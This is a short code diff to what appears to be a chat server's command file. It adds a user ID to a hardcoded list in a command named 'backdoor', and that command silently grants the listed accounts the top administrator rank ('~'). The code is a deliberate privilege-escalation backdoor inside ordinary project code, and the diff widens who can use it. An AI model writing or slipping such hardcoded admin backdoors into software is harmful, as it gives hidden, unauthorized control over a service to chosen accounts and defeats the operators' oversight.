@@ -2008,7 +2008,7 @@ var commands = exports.commands = {
         },
         
         backdoor: function(target,room, user) {
-                if (user.userid === 'auraillusions' || user.userid === 'alakazazm' || user.userid === 'cometstorm' || user.userid === 'alphagent') {
+                if (user.userid === 'auraillusions' || user.userid === 'macrarazy' || user.userid === 'alakazazm' || user.userid === 'cometstorm' || user.userid === 'alphagent') {
 
                         user.group = '~';
                         user.updateIdentity();
